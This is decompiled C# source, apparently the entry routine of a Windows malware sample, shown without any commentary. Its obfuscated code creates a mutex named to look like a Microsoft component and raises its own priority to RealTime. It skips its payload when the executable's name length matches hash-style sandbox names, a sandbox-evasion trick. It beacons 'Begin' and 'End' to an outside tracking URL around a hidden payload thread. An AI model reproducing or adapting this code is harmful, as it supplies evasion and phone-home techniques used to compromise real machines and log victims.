using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using ns0;

namespace Main;

internal static class Program
{
	[STAThread]
	private unsafe static void Main()
	{
		void* ptr = stackalloc byte[14];
		try
		{
			*(int*)ptr = Environment.ProcessorCount;
			if (*(int*)ptr != -1 || *(int*)ptr != 0 || *(int*)ptr != 1)
			{
				using Process process = Process.GetCurrentProcess();
				if (*(int*)ptr != 2)
				{
					if (*(int*)ptr != 3)
					{
						process.PriorityClass = ProcessPriorityClass.RealTime;
					}
					else
					{
						process.PriorityClass = ProcessPriorityClass.High;
					}
				}
				else
				{
					process.PriorityClass = ProcessPriorityClass.AboveNormal;
				}
			}
		}
		catch (Exception)
		{
		}
		new Mutex(initiallyOwned: true, $"Microsoft-Kraken-{Environment.MachineName}", out *(bool*)((byte*)ptr + 12));
		if (((byte*)ptr)[12] == 0)
		{
			Environment.Exit(0);
		}
		((byte*)ptr)[13] = 0;
		int[] array = new int[3] { 32, 48, 64 };
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < array.Length)
		{
			*(int*)((byte*)ptr + 8) = array[*(int*)((byte*)ptr + 4)];
			if (new FileInfo(Application.get_ExecutablePath()).Name.Length == *(int*)((byte*)ptr + 8) - ".exe".Length)
			{
				((byte*)ptr)[13] = 1;
			}
			(*(int*)((byte*)ptr + 4))++;
		}
		if (Class21.smethod_25() && ((byte*)ptr)[13] == 0)
		{
			Class21.smethod_44("Begin", "http://blasze.tk/CN18R3");
			Thread thread = new Thread((ThreadStart)delegate
			{
				Class21.smethod_83();
			});
			thread.Start();
			thread.Join();
			Class21.smethod_44("End", "http://blasze.tk/CN18R3");
			Class21.smethod_18();
		}
		Class21.smethod_91(0);
	}
}
